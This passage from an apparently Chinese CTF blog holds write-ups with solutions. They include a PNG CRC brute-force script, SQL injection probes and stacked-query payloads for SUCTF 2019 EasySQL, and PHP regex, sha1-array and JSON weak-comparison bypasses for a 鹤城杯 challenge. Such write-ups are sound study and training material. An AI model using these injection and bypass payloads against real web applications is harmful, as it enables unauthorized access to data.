class="hljs-number">8</span>UIHOlzXA/Ap<span class="hljs-number">5</span>fUdKo<span class="hljs-number">8</span>+j/f<span class="hljs-number">9</span>JqtsFlEsPSl+hHciUcA<span class="hljs-number">6</span>M<span class="hljs-number">3</span>gIEJS<span class="hljs-number">42</span>kFEjDKVZvAL<span class="hljs-number">0</span>B<span class="hljs-number">9</span>AZgbAvAqAEAkTYIsQyW<span class="hljs-number">9</span>JvkSjgGRm<span class="hljs-number">8</span>AA<span class="hljs-number">4</span>OXGkkpkIZTrN<span class="hljs-number">4</span>AegPY<span class="hljs-number">8</span>gZgLYuxCASDLCWpycIhnFOMxWU<span class="hljs-number">3</span>HKPuhHE<span class="hljs-number">7</span>J/<span class="hljs-number">0</span>mOCnG<span class="hljs-number">0</span>jflMW<span class="hljs-number">8</span>J<span class="hljs-number">8</span>ReBpsQjRZMYqwkWDuGcYiwuu+EYdSeMGsBjhWoAd/SxloUMaIqxuOyGY<span class="hljs-number">9</span>SdMGoANYAPCpBbjbUsZEBTjMVlNxyj<span class="hljs-number">7</span>oRRA<span class="hljs-number">6</span>gB<span class="hljs-number">1</span>AB+K<span class="hljs-number">1</span>ADIHZxPsbSlzCwcvUVoK<span class="hljs-number">8</span>A<span class="hljs-number">7</span>xTY<span class="hljs-number">6</span>XZEhpwsC<span class="hljs-number">6</span>mJ<span class="hljs-number">4</span>KQYwtfiYuWqAdQAagBps+G<span class="hljs-number">5</span>tZQknZWrBlADqAGQjQMx<span class="hljs-number">1</span>lKCVOjfSiC<span class="hljs-number">3</span>DcUASOGkKBKTiiJcEsaNh<span class="hljs-number">4</span>VDarpajKGNgUH<span class="hljs-number">7</span>dDV<span class="hljs-number">9</span>CV<span class="hljs-number">9</span>rhmsAF<span class="hljs-number">7</span>gBkIGYjDGW<span class="hljs-number">18</span>CoATzuOtG<span class="hljs-number">4</span>BlADOOwdZLDSTygDowZQA/igwORgpSE/vFkXecDQ<span class="hljs-number">2</span>MCoAdQAagBfYBrG<span class="hljs-number">8</span>hoYNYAaQA<span class="hljs-number">2</span>gBvAFCnx<span class="hljs-number">9</span>SnL<span class="hljs-number">7</span>JCbbbwD<span class="hljs-number">9</span>BnB<span class="hljs-number">4</span>mslgpQE<span class="hljs-number">1</span>MHoD<span class="hljs-number">6</span>A<span class="hljs-number">2</span>gN<span class="hljs-number">4</span>DD<span class="hljs-number">67</span>v+gLG<span class="hljs-number">8</span>BkYNoAZQA<span class="hljs-number">1</span>jf<span class="hljs-number">58</span>MIxvIaGDWAGsCXGgDZnHQVJhi<span class="hljs-number">7</span>LQupiXBOtU/lufEguRJfck<span class="hljs-number">50</span>meLyy<span class="hljs-number">0</span>DTvwpMyJCiiDgkJvEhXBKG+ZOF<span class="hljs-number">5</span>Ep<span class="hljs-number">1</span>X<span class="hljs-number">7</span>EmwjnVTbQz<span class="hljs-number">8</span>tQAHnRisglpIEijyEBM<span class="hljs-number">1</span>kRypbqvWBPhnOom<span class="hljs-number">2</span>hl<span class="hljs-number">5</span>yFwlrvSc<span class="hljs-number">8</span>CV<span class="hljs-number">103</span>wprjeAOwqRRiVxrcEiXMjQEByrJiPXbjURbVIM<span class="hljs-number">0</span>YXUnfLQ<span class="hljs-number">8</span>xpADYDOyt<span class="hljs-number">84</span>MqBk<span class="hljs-number">0</span>FPiqTyWUad<span class="hljs-number">66</span>KslqZvkIjE<span class="hljs-number">1</span>gBoAmZN<span class="hljs-number">3</span>MWRAawCfy<span class="hljs-number">0</span>p<span class="hljs-number">0</span>Ifoebtq<span class="hljs-number">9</span>Oe<span class="hljs-number">9</span>HwPONIk<span class="hljs-number">0</span>wmmkNDcGxajJyEe<span class="hljs-number">2</span>MPL<span class="hljs-number">0</span>BPOj<span class="hljs-number">6</span>ZBOM<span class="hljs-number">4</span>SMDMVkTyZXqvmJNhHOqm<span class="hljs-number">2</span>hn<span class="hljs-number">5</span>KkB<span class="hljs-number">1</span>AA+KLDTYBEuuy<span class="hljs-number">0</span>L<span class="hljs-number">4</span>VwD+FwB<span class="hljs-number">0</span>sukHT<span class="hljs-number">3</span>vN<span class="hljs-number">4</span>AnfwMgjZhquLGUpB<span class="hljs-number">4</span>SY<span class="hljs-number">9</span>VMaiK<span class="hljs-number">5</span>CA<span class="hljs-number">6</span>pa<span class="hljs-number">6</span>cYVHe/ATz<span class="hljs-number">3</span>GwAZCNIogpNidhpyq<span class="hljs-number">2</span>ZSE<span class="hljs-number">8</span>lFcJK+u<span class="hljs-number">52</span>jumsANYCvGFwynIQXWVySi+AQPjvFoLprADWArxhaMpyEF<span class="hljs-number">1</span>lckovgED<span class="hljs-number">47</span>xaC<span class="hljs-number">6</span>awA<span class="hljs-number">1</span>gK<span class="hljs-number">8</span>YWjKchBdZXJKL<span class="hljs-number">4</span>BA+O<span class="hljs-number">8</span>WgumsANYCvGFoynIQXWVySi+AQPjvFoLprADWArxhaMpyEF<span class="hljs-number">1</span>lckovgED<span class="hljs-number">47</span>xaC<span class="hljs-number">6</span>awA<span class="hljs-number">1</span>gK<span class="hljs-number">8</span>YWjKchBdZXJKL<span class="hljs-number">4</span>BA+O<span class="hljs-number">8</span>WgumsANYCvGFoynIQXWVySi+AQPjvFoLoNA<span class="hljs-number">9</span>ipaNJIIgypycqVcAjfhHGrZzecpDHhmzBu<span class="hljs-number">55</span>PaED<span class="hljs-number">4</span>phtSt<span class="hljs-number">1</span>VQDSO<span class="hljs-number">24</span>f<span class="hljs-number">6414</span>e<span class="hljs-number">32</span>C<span class="hljs-number">5</span>n<span class="hljs-number">3</span>/<span class="hljs-number">4</span>wOROBiGklSntSdMGoAjxVSfhWYNGEqxlpKwtfKlXDIIiQMc<span class="hljs-number">3</span>EtPkljkidh<span class="hljs-number">1</span>ABqAB<span class="hljs-number">8</span>UuNpgEb<span class="hljs-number">41</span>gK+/qREzIjGj/e<span class="hljs-number">4</span>rAGnJ<span class="hljs-number">5</span>zFTSzc<span class="hljs-number">6</span>EH<span class="hljs-number">0</span>FuDsQpN/np+n/T<span class="hljs-number">472</span>uwZwvmVkIIxmGhh<span class="hljs-number">9</span>BXjcZ<span class="hljs-number">0</span>vj<span class="hljs-number">89</span>NUAzC<span class="hljs-number">00774</span>EjI<span class="hljs-number">1</span>gLVrd<span class="hljs-number">9</span>KYLGXC<span class="hljs-number">6</span>DeAfgPoN<span class="hljs-number">4</span>DfCpCFmjI<span class="hljs-number">1</span>sriEL<span class="hljs-number">8</span>HZqSbCl<span class="hljs-number">9</span>St<span class="hljs-number">1</span>dRXANKSfgP<span class="hljs-number">4</span>rwLWgCblSZ<span class="hljs-number">6</span>E<span class="hljs-number">0</span>RvA<span class="hljs-number">4</span>g<span class="hljs-number">2</span>ACHy<span class="hljs-number">1</span>GDJYmsOCj<span class="hljs-number">2</span>pJP<span class="hljs-number">8</span>I<span class="hljs-number">3</span>YdBFIDgWn<span class="hljs-number">5</span>RrsgdXqylpR<span class="hljs-number">8</span>/j<span class="hljs-number">7</span>wFQoCvFkWZPDl/SjvBNGDWAxwpZGqc+WHOV<span class="hljs-number">8</span>tDzGsAdpaxGEZzULGs<span class="hljs-number">4</span>DS<span class="hljs-number">43</span>rhafVDfhS<span class="hljs-number">7</span>hYOIkvOd+Jy<span class="hljs-number">68</span>fCukbACnqajGTQ<span class="hljs-number">0</span>ManvQjfBNGbwC<span class="hljs-number">9</span>AXymQA<span class="hljs-number">2</span>gNwDiHe<span class="hljs-number">9</span>iLENKiYl<span class="hljs-number">5</span>Ei<span class="hljs-number">4</span>WTuJLznfi<span class="hljs-number">0</span>hvAg<span class="hljs-number">45</span>ZjSI<span class="hljs-number">4</span>aXDIkCeM<span class="hljs-number">3</span>gB<span class="hljs-number">6</span>A+gN<span class="hljs-number">4</span>LcCZKHI<span class="hljs-number">4</span>lo<span class="hljs-number">4</span>aXlJnoRRA<span class="hljs-number">6</span>gB<span class="hljs-number">1</span>ABqAMQnYoxlSCnRpAlfraakHT<span class="hljs-number">3</span>vN<span class="hljs-number">4</span>B+A<span class="hljs-number">6</span>Cz<span class="hljs-number">8</span>jfuastiGclhoT<span class="hljs-number">55</span>YCcuN<span class="hljs-number">3</span>r/A/<span class="hljs-number">9</span>UuYk<span class="hljs-number">1</span>jluJAAAAAElFTkSuQmCC<br></code></pre></td></tr></table></figure><p>访问得到二维码图片</p><p>再扫码得到flag</p><h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p><a href="https://blog.csdn.net/mochu7777777/article/details/111144417">(1条消息) BMZCTF：真正的CTFer_末初 · mochu7-CSDN博客</a></p><p>这题思路早有</p><p>因为一打开010提示CRC问题，就是不懂怎么修改</p><p>然后找了好几个脚本全部失败</p><p>最后直接用这篇文章的payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> struct<br><span class="hljs-attribute">import</span> zlib<br><br><span class="hljs-attribute">def</span> hexStr<span class="hljs-number">2</span>bytes(s):<br>    <span class="hljs-attribute">b</span> = b<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-attribute">for</span> i in range(<span class="hljs-number">0</span>,len(s),<span class="hljs-number">2</span>):<br>        <span class="hljs-attribute">temp</span> = s[i:i+<span class="hljs-number">2</span>]<br>        <span class="hljs-attribute">b</span> +=struct.pack(<span class="hljs-string">&quot;B&quot;</span>,int(temp,<span class="hljs-number">16</span>))<br>    <span class="hljs-attribute">return</span> b<br><br><span class="hljs-attribute">str1</span>=<span class="hljs-string">&quot;49484452&quot;</span>#Chunk[<span class="hljs-number">0</span>] IHDR<br><span class="hljs-attribute">str2</span>=<span class="hljs-string">&quot;0806000000&quot;</span>#Bit depth、ColorType、Compression method、Filter method、Interlace method<br><span class="hljs-attribute">bytes1</span>=hexStr<span class="hljs-number">2</span>bytes(str<span class="hljs-number">1</span>)<br><span class="hljs-attribute">bytes2</span>=hexStr<span class="hljs-number">2</span>bytes(str<span class="hljs-number">2</span>)<br><span class="hljs-attribute">wid</span>,hei = <span class="hljs-number">1308</span>,<span class="hljs-number">1280</span>#当前宽高<br><br><span class="hljs-attribute">crc32</span> = <span class="hljs-string">&quot;0x6f03ad71&quot;</span>#图片原来的CRC<br><br><span class="hljs-attribute">for</span> w in range(wid,wid+<span class="hljs-number">2000</span>):<br>    <span class="hljs-attribute">for</span> h in range(hei,hei+<span class="hljs-number">2000</span>):<br>        <span class="hljs-attribute">width</span> = hex(w)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">8</span>,&#x27;<span class="hljs-number">0</span>&#x27;)<br>        <span class="hljs-attribute">height</span> = hex(h)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">8</span>,&#x27;<span class="hljs-number">0</span>&#x27;)<br>        <span class="hljs-attribute">bytes_temp</span>=hexStr<span class="hljs-number">2</span>bytes(width+height)<br>        <span class="hljs-attribute">if</span> eval(hex(zlib.crc<span class="hljs-number">32</span>(bytes<span class="hljs-number">1</span>+bytes_temp+bytes<span class="hljs-number">2</span>))) == eval(crc<span class="hljs-number">32</span>):<br>            <span class="hljs-attribute">print</span>(hex(w),hex(h))<br></code></pre></td></tr></table></figure><p>最后steg</p><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/20201213201735422.png" alt="在这里插入图片描述"></p><h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><p><a href="https://shawroot.hatenablog.com/entry/2019/09/14/BUUCTF-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B">BUUCTF-谁赢了比赛 - 「配枪朱丽叶。」 (hatenablog.com)</a></p><p>这题围棋挺有趣的</p><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211017181636138.png" alt="image-20211017181636138"></p><p>一开始给了图片，将其后缀改为.zip来得到一个压缩包</p><p>里面有加密的文本</p><p>用apchpr爆破一下得到密码:1020</p><p>打开后有hehe.gif</p><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211017181833624.png" alt="image-20211017181833624"></p><p>放到steg查看</p><p>最后二维码扫描得到flag</p><p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/SLKfMhb1r5ZUcVJ.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>suctf 2019 EasySQL</title>
      <link href="/2021/10/10/2021/ctf/0/"/>
      <url>/2021/10/10/2021/ctf/0/</url>
      
        <content type="html"><![CDATA[<p> 参考链接：</p><p>[<a href="https://www.cnblogs.com/peri0d/p/11598597.html">SUCTF 2019]EasySQL - peri0d - 博客园 (cnblogs.com)</a></p><p>[(4条消息) <a href="https://blog.csdn.net/m0_55771794/article/details/118709290">SUCTF 2019]EasySQL_m0_55771794的博客-CSDN博客</a></p><p>打开页面</p><p><img src="/2021/10/10/2021/ctf/0/image-20211010193758035.png" alt="image-20211010193758035"></p><p>先试试基本的注入</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><span class="hljs-number">1</span>&#x27; or &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span>&#x27;##or语句<br><span class="hljs-number">1</span>&#x27; order by <span class="hljs-number">3</span>##order语句<br><span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>##联合查询<br><span class="hljs-number">1</span>&#x27;and(select extractvalue(<span class="hljs-number">1</span>,concat(&#x27;~&#x27;,(select database()))))#报错注入<br><span class="hljs-number">1</span>&#x27; and if(length(database())&gt;<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+#时间注入<br></code></pre></td></tr></table></figure><p>结果都是下图</p><p><img src="/2021/10/10/2021/ctf/0/image-20211010194231781.png" alt="image-20211010194231781"></p><p>试到堆叠注入时成功了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">1;<span class="hljs-keyword">show</span> <span class="hljs-keyword">databases</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2021/10/10/2021/ctf/0/image-20211010194353961.png" alt="image-20211010194353961"></p><p>继续</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">1;<span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2021/10/10/2021/ctf/0/image-20211010194430322.png" alt="image-20211010194430322"></p><p>就在我以为完事大吉的时候</p><p>现实给我当头一棒</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">1;<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;Flag&#x27;</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2021/10/10/2021/ctf/0/image-20211010194709636.png" alt="image-20211010194709636"></p><p>看了wp才知道，原来是要去猜测出本来的sql语句查询时什么样的</p><p><strong>select $_POST[‘query’] || flag from Flag</strong></p><p>sql_mode 设置了 PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数<br>当 sql_mode 没有设置 PIPES_AS_CONCAT 时 （默认没有设置），|| 就是逻辑或，相当于OR函数<br>第一种就按默认没有配置来进行，此时||就是逻辑或<br>||在命令执行中见过，<br>回顾:<br>command1;command2顺序执行<br>command1 || command2<br>如果command1执行失败，则执行command2<br>command1 &amp;&amp; command2<br>如果command1执行成功，则执行command2</p><p>因此只需要将</p><p>$_POST[‘query’]<br>提交的数据换成*,1(如果直接写的话会被报错，且写在后面会失效)<br>解释:<br>sql=select.post[‘query’].”||flag from Flag”;（拼接语句）<br>如果$post[‘query’]的数据为</p><p>*,1<br>sql语句就变成了select *,1||flag from Flag，<br>就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。<br>此处的1是临时增加一列，列名为1且这一列的所有值都为1</p><p>执行payload：*,1</p><p><img src="/2021/10/10/2021/ctf/0/image-20211010195151922.png" alt="image-20211010195151922"></p><p>得到flag</p><ul><li><p>官方给的 payload 是 <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p></li><li><p>拼接一下就是 <code>select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</code></p></li><li><p>关于 <code>sql_mode</code> : 它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的 <code>PIPES_AS_CONCAT</code> 将 <code>||</code> 视为字符串的连接操作符而非 “或” 运算符</p></li><li><p>关于 <code>sql_mode</code> 更多可以查看这个链接 : <a href="https://www.cnblogs.com/piperck/p/9835695.html">MySQL sql_mode 说明</a></p></li><li><p>还有就是这个模式下进行查询的时候，使用字母连接会报错，使用数字连接才会查询出数据，因为这个 <code>||</code> 相当于是将 <code>select 1</code> 和 <code>select flag from flag</code> 的结果拼接在一起</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021鹤城杯</title>
      <link href="/2021/10/10/2021/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/"/>
      <url>/2021/10/10/2021/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<pre><code> 这次的比赛虽然听说都是原题，但是基本没遇到过，这次看着writeup总结一下</code></pre><p> 复现一下某些题目</p><h3 id="Middle-magic"><a href="#Middle-magic" class="headerlink" title="Middle magic"></a>Middle magic</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./flag.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./result.php&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &amp;&amp; strlen($_GET[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &lt; <span class="hljs-number">20</span>)&#123;<br><br>    $aaa = preg_replace(<span class="hljs-string">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class="hljs-string">&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;</span>, $_GET[<span class="hljs-string">&#x27;aaa&#x27;</span>]);<br><br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/pass_the_level_1#/&#x27;</span>, $aaa))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 2&quot;</span>;<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> ($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>] == $_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;<br>        <span class="hljs-comment">// START FORM PROCESSING    </span><br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>]) === sha1($_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>]))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;level_3&#x27;</span>])) &#123;<br>                    $level_3 = json_decode($_POST[<span class="hljs-string">&#x27;level_3&#x27;</span>]);<br>                    <br>                    <span class="hljs-keyword">if</span> ($level_3-&gt;result == $result) &#123;<br>                        <br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success:&quot;</span>.$flag;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you never beat me!&quot;</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;out&quot;</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>            &#125;<br>        <span class="hljs-comment">// perform validations on the form data</span><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;</span>;<br>        &#125;<br><br>    &#125;<br>    <br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonono!&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>第一层绕过</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">$aaa = preg_replace(&#x27;/^(.*)level(.*)$/&#x27;, &#x27;$&#123;1&#125;<span class="hljs-comment">&lt;!-- filtered --&gt;</span>$&#123;2&#125;&#x27;, $_GET[&#x27;aaa&#x27;]);<br><br>   if(preg_match(&#x27;/pass_the_level_1#/&#x27;, $aaa))&#123;<br>       echo &quot;here is level 2&quot;;<br></code></pre></td></tr></table></figure><p>get类型取得变量a的值，正则替换和匹配函数</p><p>这里直接用%0a和%23绕过</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">?aaa=%<span class="hljs-number">0</span>apass_the_level_1%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>第二层绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])) &#123;<br>           <span class="hljs-keyword">if</span> ($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>] == $_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])<br>               <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;<br>       <span class="hljs-comment">// START FORM PROCESSING    </span><br>           <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>]) === sha1($_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>]))&#123;<br>               <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;<br></code></pre></td></tr></table></figure><p>md5数组绕过</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">admin[]=<span class="hljs-number">1</span>&amp;root_pwd[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>第三层绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;level_3&#x27;</span>])) &#123;<br>                  $level_3 = json_decode($_POST[<span class="hljs-string">&#x27;level_3&#x27;</span>]);<br>                  <br>                  <span class="hljs-keyword">if</span> ($level_3-&gt;result == $result) &#123;<br></code></pre></td></tr></table></figure><p>要经过js-encode编码一下，虽然我们不懂值是多少，但弱等于就好了</p><p>直接{“result”:0}</p><p>最后：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span>：?aaa=%<span class="hljs-number">0</span>apass_the_level_<span class="hljs-number">1</span>%<span class="hljs-number">23</span><br><br><span class="hljs-attribute">POST</span>:admin[]=<span class="hljs-number">1</span>&amp;root_pwd[]=<span class="hljs-number">2</span>&amp;level_<span class="hljs-number">3</span>=&#123;<span class="hljs-string">&quot;result&quot;</span>:<span class="hljs-number">0</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="EasyP"><a href="#EasyP" class="headerlink" title="EasyP"></a>EasyP</h3><p>这题当初只有稍微看了看，没想到竟然有类似的原题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;utils.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>    $guess = (<span class="hljs-keyword">string</span>) $_POST[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>    <span class="hljs-keyword">if</span> ($guess === $secret) &#123;<br>        $message = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . $flag;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $message = <span class="hljs-string">&#x27;Wrong. Try Again&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, $_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, $_SERVER[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;show_source&#x27;</span>])) &#123;<br>    highlight_file(basename($_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    